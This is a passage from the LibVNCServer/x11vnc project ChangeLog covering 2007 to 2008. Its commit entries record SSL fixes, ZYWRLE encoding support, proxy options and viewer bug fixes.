	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: synchronize ssvnc

2008-10-29  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/help.c, x11vnc/nox11.h, x11vnc/remote.c, x11vnc/screen.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c, x11vnc/xevents.c: x11vnc:
	-http_oneport for single port HTTP and VNC. Improve find_display wrt
	lsof blocking with -b.

2008-10-19  runge <runge>

	*
	x11vnc/misc/enhanced_tightvnc_viewer/bin/Darwin.Power.Macintosh/vnc
	viewer.sh, x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: Sync SSVNC changes: fullscreen fixes, local scaling,
	-chatonly, iso-8859-1/utf8 etc., etc.

2008-10-19  runge <runge>

	* classes/ssl/ss_vncviewer,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: Update ssl VNC
	viewer jars and patch file.

2008-10-19  runge <runge>

	* x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/cleanup.c, x11vnc/connections.c, x11vnc/connections.h,
	x11vnc/cursor.c, x11vnc/enc.h, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/linuxfb.c, x11vnc/options.c, x11vnc/options.h,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/scan.h, x11vnc/screen.c,
	x11vnc/screen.h, x11vnc/selection.c, x11vnc/solid.c,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/unixpw.c, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xevents.c,
	x11vnc/xinerama.c, x11vnc/xrandr.c, x11vnc/xrandr.h,
	x11vnc/xrecord.c, x11vnc/xwrappers.c, x11vnc/xwrappers.h: x11vnc:
	-chatwindow, -scale WxH, -enc changes.

2008-09-21  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/Makefile.am,
	x11vnc/README, x11vnc/enc.h, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pointer.c,
	x11vnc/screen.c, x11vnc/sslhelper.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/util.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: Add symmetric key encryption -enc
	cipher:keyfile, works with SSVNC.  Make -remap work on MacOSX
	console.  update to 0.9.5 strings.  Add a couple menu items to
	tkx11vnc.

2008-09-17  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/sslhelper.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: x11vnc: make -allow work in -ssl mode.

2008-09-14  runge <runge>

	* classes/ssl/ss_vncviewer,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/gui.c, x11vnc/help.c,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvnc.1,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch, x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/userinput.c, x11vnc/util.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc:
	-sleepin m-n for random sleep. More mktemp and mkstemp protections.
	SSL_INIT_TIMEOUT=n env. var.  Fix macosx console X call bug.
	Synchronize other projects sources.

2008-09-07  runge <runge>

	* classes/ssl/ss_vncviewer,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch, x11vnc/8to24.c,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/gui.c, x11vnc/gui.h, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/macosxCG.c, x11vnc/macosxCG.h,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/sshvnc.bat,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/tsvnc.bat,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/sshvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/tsvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvnc.1,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_getpatches,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch, x11vnc/options.c, x11vnc/options.h, x11vnc/pointer.c,
	x11vnc/remote.c, x11vnc/solid.c, x11vnc/ssltools.h,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xevents.c,
	x11vnc/xevents.h, x11vnc/xinerama.c, x11vnc/xinerama.h: x11vnc: kill
	   gui_pid on exit in -connect/-connect_or_exit mode.  -grablocal n
	   experiment (not compiled by default).  -macuskbd option for macosx
	   for orig uskdb code. keycode=N remote contol cmd.  Find dpy look at
	   non-NFS cookies in /tmp.  Fix gui tray insertion on recent gnome dt.
	Fix connect_file bug. Sync SSVNC

2008-06-24  runge <runge>

	* libvncserver/rfbserver.c: We seem to need to guard against freeing
	iterator 'i' twice in rfbSendFramebufferUpdate()  (italc reported
	bug)

2008-06-07  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/unixpw.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xinerama.c: x11vnc: -clip xineramaN option, -DIGNORE_GETSPNAM
	          for HP-UX.  Print info on SSH_CONNECTION override.

2008-06-03  dscho <dscho>

	* ChangeLog, client_examples/SDLvncviewer.c: SDLvncviewer: update
	screen correctly after a resize Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-06-03  runge <runge>

	* configure.ac: Enable --with-ssl=DIR option.

2008-06-01  runge <runge>

	* x11vnc/README, x11vnc/options.c, x11vnc/options.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc:
	lower waitms and defer if framebuffer reads are fast (> 100MB/s)

2008-06-01  runge <runge>

	* x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/connections.c, x11vnc/cursor.c, x11vnc/help.c,
	x11vnc/misc/Xdummy, x11vnc/options.c, x11vnc/options.h,
	x11vnc/scan.c, x11vnc/screen.c, x11vnc/userinput.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xinerama.c: x11vnc: support colormaps for depths other than
	8.  xinerama warppointer only if more than one subscreen.

2008-05-31  dscho <dscho>

	* .gitignore: .gitignore: ignore also temporary editor files Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-05-31  dscho <dscho>

	* VisualNaCro/.gitignore: VisualNaCro: add .gitignore file Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-05-31  dscho <dscho>

	* VisualNaCro/configure.ac: VisualNaCro: fix configure.ac There was a misunderstanding as to the workings of AC_CHECK_PROG().  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-05-31  dscho <dscho>

	* TODO: Update TODOs Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-05-31  dscho <dscho>

	* libvncserver-config.in: Fix libvncserver-config for in-place
	operation Since quite some time, the linkable libraries are stored in the
	.libs/ subdirectories.  Adjust libvncserver-config to account for
	that when running without installing.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-05-23  runge <runge>

	* libvncserver/rfbserver.c: Handle colormaps with more than 256
	colors.

2008-05-13  dscho <dscho>

	* examples/mac.c: examples/mac: disable the cursor We cannot write access the frame buffer, and we do not have a
	sensible cursor anyway, so better disable the cursor (which would
	have to be drawn for clients that do not support
	CursorShapeUpdates).  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-05-13  dscho <dscho>

	* client_examples/SDLvncviewer.c: SDLvncviewer: add -viewonly Just like its siblings from other projects, SDLvncviewer now
	supports viewonly connections.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-05-12  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/selection.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: x11vnc: SSL fixes.  Increase cert lifetimes to
	2 years.  Print ssl err msg.

2008-05-12  runge <runge>

	* configure.ac: Add X509_print_ex_fp check for x11vnc.

2008-05-12  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/connect_br.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: Many improvement to the frontend and unix viewer.
	UltraVNC proxy support, and other proxy improvements.

2008-05-08  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/gui.c, x11vnc/help.c, x11vnc/options.c, x11vnc/scan.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/user.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: add UltraVNC repeater proxy support.
	        fix to setp gui mode. -threads is now strongly discouraged.  Read
	        PORT= in url.  User can set nolisten for Xvfb in -create mode.
	        clean up wait_for_client() to some degree.

2008-05-08  runge <runge>

	* classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: Add check for
	"https" to viewers.  update jars.

2008-04-28  dscho <dscho>

	* rfb/rfbclient.h: Fix compilation in the absence of libjpeg The JPEG library is not necessarily installed everywhere, and
	sometimes it is outright undesirable to compile with JPEG support,
	e.g. when the server is not very fast.  So fix the compilation for
	that case.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-03-21  dscho <dscho>

	* TODO: Update TODOs Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-02-18  dscho <dscho>

	* ChangeLog, libvncserver/rfbregion.c: Please MS Visual C++ a bit
	(Christian Ehrlicher) Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-02-18  runge <runge>

	* classes/ssl/ss_vncviewer, x11vnc/README: Update ssl jars.

2008-02-18  runge <runge>

	* x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: changes for
	release

2008-02-18  runge <runge>

	* x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: minor date changes.

2008-02-18  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: ssvnc sync with zywrle support and improvements to popup.

2008-02-04  dscho <dscho>

	* ChangeLog, libvncclient/rfbproto.c, libvncclient/zrle.c: ZYWRLE
	patch for libvncclient (thanks Noriaki Yamazaki) Highlite:  * use qualityLevel/zlib_buffer. No new variable is needed.   * Change coding style to recursive fashion.   * Change meaning of qualityLevel== 9 for easy calc zywrle_level:      old:zywrle_level== 1      new:disable ZYWRLE(same as ZRLE)    so, we should not use this value for compatible reason.   * Color mode handling isn't complete.     I provided and checked 16 bit colors(RGB555,RGB565) and    some color mode of 32 bit colors for little endian mode.     we must make and check 24 bit colors and big endian mode.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-02-04  dscho <dscho>

	* ChangeLog, libvncserver/zywrletemplate.c: Fix ZYWRLE en/decoding
	for width != scanline (thanks Noriaki Yamazaki) Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-02-03  runge <runge>

	* libvncserver/stats.c: Add ZYWRLE to server printout.

2008-02-02  dscho <dscho>

	* ChangeLog, TODO, client_examples/SDLvncviewer.c: SDLvncviewer: fix
	button handling For some reason, I swapped buttons 2 and 3 on Dec 7, 2005, in commit
	"translate keys based on unicode (much more reliable than sym)".  I
	do not remember why, nor what I smoked, but this was wrong.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-02-02  dscho <dscho>

	* TODO, client_examples/SDLvncviewer.c: SDLvncviewer: fix
	Ctrl+<letter> Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-02-02  dscho <dscho>

	* TODO, client_examples/SDLvncviewer.c: SDLvncviewer: fix
	translation of the Tab key Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-02-02  dscho <dscho>

	* TODO: Updated TODOs Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-02-01  runge <runge>

	* libvncserver/Makefile.am: Need to include zywrletemplate.c in
	Makefile.am

2008-02-01  runge <runge>

	* classes/ssl/ss_vncviewer: sync java viewer.

2008-02-01  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch, x11vnc/rates.c, x11vnc/ssltools.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c: x11vnc: during speeds
	estimate, guard against client disconnecting.

2008-01-31  dscho <dscho>

	* libvncserver/rfbserver.c: Fix rfbSendSupportedEncodings There was a long standing TODO to make the counting of the supported
	encodings dynamic.  It never triggered, until ZYWRLE was added.  Noticed by Christian Ehrlicher.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-31  dscho <dscho>

	* Makefile.am, configure.ac: Recurse into subdirectory x11vnc/ when
	configuring with --with-x11vnc Since we separated the packages LibVNCServer and x11vnc, there is a
	configure switch --with-x11vnc, without which x11vnc is not built.  However, even _with_ this switch, it is not built, because the
	Makefile would not recurse into the x11vnc/ subdirectory.  Fix that.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-31  dscho <dscho>

	* libvncserver/rfbserver.c: Fix Swap16IfLE() on bytes When swapping the values for the colour table to little-endian
	(because they are 16-bit values), we need to cast "unsigned char" to
	"unsigned short"; otherwise, Microsoft's compiler would keep
	complaining.  Noticed by Christian Ehrlicher.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-31  dscho <dscho>

	* libvncserver/rfbserver.c, rfb/rfb.h: Move tightQualityLevel out of
	the JPEG specific part The variable tightQualityLevel is used for ZYWRLE compression, too,
	so if libjpeg is not present, but libz is, we still need to have
	that struct member.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-30  dscho <dscho>

	* libvncserver/zrle.c, libvncserver/zrleencodetemplate.c, rfb/rfb.h: 
	Make ZYWRLE thread-safe for multiple clients ZYWRLE used a static buffer, which does not work too well if you
	have more than one client in a threaded server.  Instead, we have
	the data in the client structure now.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-30  dscho <dscho>

	* libvncserver/zrle.c, libvncserver/zywrletemplate.c: ZYWRLE brown
	paper bag fix While adjusting the coding style, three stupid mistakes happened.
	The quality is _not_ just 1, 2, 3, but really 1, 3, 2.  And the
	macros ZYWRLE_PACK_COEFF() and ZYWRLE_UNPACK_COEFF() expand to more
	than one statement, which means that we need curly brackets around
	them when they are in an if clause.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-29  dscho <dscho>

	* TODO: Update TODOs Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-29  dscho <dscho>

	* .gitignore: Add a .gitignore file At least one developer (me) uses git to work on local branches, and
	this file does not hurt.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-29  dscho <dscho>

	* ChangeLog, libvncserver/rfbserver.c: Add missing #include <time.h>
	(thanks Christian Ehrlicher) Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-29  dscho <dscho>

	* AUTHORS, ChangeLog, libvncserver/rfbserver.c,
	libvncserver/scale.c, libvncserver/zrle.c,
	libvncserver/zrleencodetemplate.c, libvncserver/zywrletemplate.c,
	rfb/rfbproto.h: Add ZYWRLE server-side support (thanks Noriaki
	Yamazaki, Hitachi) Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-29  dscho <dscho>

	* AUTHORS, CMakeLists.txt, ChangeLog, configure.ac,
	rfb/rfbconfig.h.cmake, rfb/rfbint.h.cmake: Add CMake support (thanks
	to Christian Ehrlicher) Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2008-01-15  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/scan.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: -ping option, fix memory corruption in
	copy_tiles after xrandr resize.

2007-12-16  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c, x11vnc/gui.c,
	x11vnc/macosxCG.c, x11vnc/remote.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: setup remote-ctrl file by default on
	        macosx. improve tkx11vnc wrt attaching to existing server in
	icon/tray mode.

2007-12-16  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch: Fixes for MacOSX 10.5.  Improve usage of x11 viewer on
	macosx.

2007-12-16  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/keyboard.c,
	x11vnc/macosxCG.c, x11vnc/macosxCGS.c, x11vnc/ssltools.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: fix
	find_display and usleep() prototype on macosx.  -display console and
	check DISPLAY /tmp/...:0 on macosx.  implement -noxinerama.

2007-11-13  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c, x11vnc/help.c,
	x11vnc/keyboard.c, x11vnc/keyboard.h, x11vnc/options.c,
	x11vnc/remote.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: add
	clear_locks (Caps_Lock, etc) action.

2007-10-27  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/connect_br.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle: ssvnc
	sync: connect_br.tcl socks4/5 http proxies, ss_vncviewer socks5
	proxy. ssh 1st proxy. whatismyip.com fix. 127.0.0.1 on Darwin

2007-10-27  runge <runge>

	* classes/ssl/ss_vncviewer: ssl java and ss_vncviewer (socks5) sync.

2007-10-27  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/8to24.c, x11vnc/ChangeLog,
	x11vnc/README, x11vnc/cleanup.c, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/keyboard.c, x11vnc/macosxCGP.c,
	x11vnc/macosxCGS.c, x11vnc/options.c, x11vnc/options.h,
	x11vnc/remote.c, x11vnc/screen.c, x11vnc/selection.c,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/util.c, x11vnc/win_utils.c,
	x11vnc/winattr_t.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xrecord.c: x11vnc: -proxy, -ssh
	options. ncache bug in -8to24, Selection "targets" bugfix.

2007-10-04  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/ssltools.h, x11vnc/user.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: add xfce to createdisplay

2007-09-26  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/ssltools.h, x11vnc/user.c, x11vnc/util.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c: x11vnc: COLUMNS=256 and other fixes to
	find/create scripts. More ratecheck.

2007-09-17  dscho <dscho>

	* libvncserver/rfbserver.c: Avoid misaligned access on 64-bit
	machines We used to assume that a char[256] is properly aligned to be cast to
	an rfbServerInitMsg, but that was not the case.  So use a union
	instead.  Noticed by Flavio Leitner.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2007-09-11  runge <runge>

	* classes/ssl/ss_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: update
	ss_vncviewer script, jars, and patch files.

2007-09-11  runge <runge>

	* x11vnc/ChangeLog, x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/README.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle: ssvnc:
	          sshvnc ssh-only, tsvnc Terminal Services modes.  Improvements to
	          ss_vncviewer.  Automatically find X dpy and X login.  Reorganize
	menus a bit.  ~/.ssvncrc file.

2007-09-11  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/cursor.c, x11vnc/help.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/screen.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xrecord.c, x11vnc/xwrappers.c: x11vnc:
	          fix wireframe crash under -clip.  Add -redirect for VNC redir.
	          -rawfb nullbig, randbig, solid, swirl, etc.  FD_XDM mode to
	          find_display.  -listdpy.  Add enlightenment.  Xvnc.redirect
	          FINDDISPLAY-vnc_redirect. -xvnc, -xvnc_redirect, -svc_xvnc.
	AUTO_PORT.

2007-09-05  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/keyboard.c, x11vnc/misc/Xdummy, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/screen.c, x11vnc/solid.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xevents.c,
	x11vnc/xevents.h, x11vnc/xrandr.c, x11vnc/xwrappers.c: x11vnc:
	-autoport, -finddpy, -xdummy. watch xrandr events.
	check_redir_services() utilities for Terminal services.  Improve
	Xdummy.

2007-09-05  runge <runge>

	* ChangeLog, classes/ssl/Makefile.am, classes/ssl/proxy.vnc,
	classes/ssl/ss_vncviewer,
	classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	classes/ssl/ultraproxy.vnc,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch: classes/ssl:
	improve timeouts, port fallback, and connection time.

2007-08-19  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/keyboard.c, x11vnc/x11vnc.1: 
	malloc score_hint and make it shorts to save space.

2007-08-19  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/keyboard.c, x11vnc/ssltools.h, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: x11vnc: better -xkb
	tie-breaking for up keystrokes.  Add Xsrv/FD_XSRV custom server to
	FINDCREATEDISPLAY list.

2007-08-18  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/solid.c,
	x11vnc/ssltools.h, x11vnc/user.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: x11vnc: improve FINDCREATEDISPLAY (-create)
	script, FD_GEOM, FD_SESS, FD_OPTS, FD_PROG env vars, add Xvnc
	support

2007-08-16  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/user.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: x11vnc: add reverse -connect
	support to -display WAIT:, fix SSL Fetch cert only for -display
	WAIT:

2007-08-14  dscho <dscho>

	* AUTHORS, ChangeLog, libvncclient/rfbproto.c: LibVNCClient: if the
	GotRect hook is set, override default op.

2007-08-04  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/solid.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c, x11vnc/xevents.c: x11vnc: -xrefresh,
	.DCOPserver bug, -unixpw_unsafe ignores SSH tunnel.

2007-08-04  runge <runge>

	* libvncclient/vncviewer.c: argv > 0 doesn't make sense for a
	pointer; assuming argv != NULL.

2007-07-05  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/scan.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/userinput.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: -debug_ncache, fix
	big fonts in tkx11vnc.

2007-07-05  runge <runge>

	* configure.ac, prepare_x11vnc_dist.sh: configure.ac check for
	external system libvncserver version. set x11vnc version 0.9.3

2007-06-18  runge <runge>

	* x11vnc/README, x11vnc/options.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc_defs.c: x11vnc: set NCACHE -1 for release.

2007-06-15  runge <runge>

	* ChangeLog, classes/ssl/ultra.vnc, classes/ssl/ultrasigned.vnc,
	classes/ssl/ultravnc-102-JavaViewer-ssl-etc.patch, configure.ac,
	x11vnc/ChangeLog, x11vnc/README,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/Darwin.Power.Macintosh/vnc
	viewer.sh, x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
